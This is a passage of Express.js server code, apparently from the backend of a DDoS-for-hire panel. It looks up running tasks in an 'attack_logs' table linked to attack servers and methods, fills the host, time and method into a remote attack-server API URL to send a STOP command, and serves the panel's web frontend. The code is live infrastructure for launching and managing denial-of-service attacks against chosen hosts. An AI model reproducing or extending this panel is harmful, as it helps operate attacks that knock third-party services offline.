      `SELECT l.id, l.host, l.server_id, l.method_id, l.status, s.api_url, s.name AS server_name, m.name AS method_name
       FROM attack_logs l
       JOIN servers s ON s.id = l.server_id
       JOIN methods m ON m.id = l.method_id
       WHERE l.id = ? AND l.status = 'running'`,
      [taskId],
    );
    if (!log) return res.status(404).json({ message: "Task tidak ditemukan" });

    const url = log.api_url
      .replace(/\[host\]/g, encodeURIComponent(log.host))
      .replace(/\[time\]/g, "0")
      .replace(/\[method\]/g, "STOP");

    try {
      const resp = await fetch(url);
      const body = await resp.text().catch(() => "");
      console.log("[PANEL STOP]", {
        url,
        status: resp.status,
        server: log.server_name,
        method: log.method_name,
        body: body.slice(0, 200),
      });
    } catch (err) {
      console.error("[PANEL STOP ERROR]", { url, server: log.server_name, error: err.message });
    }

    await run("UPDATE attack_logs SET status = 'completed' WHERE id = ?", [taskId]);
    return res.json({ message: "Dihentikan" });
  } catch (err) {
    console.error("Stop panel error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

const webRoot = path.join(__dirname, "..", "public");
app.use(express.static(webRoot));
app.get(/.*/, (req, res) => {
  if (req.path.startsWith("/api")) {
    return res.status(404).json({ message: "Not found" });
  }
  return res.sendFile(path.join(webRoot, "index.html"));
});

// auth routes moved to routes/auth.js

module.exports = app;
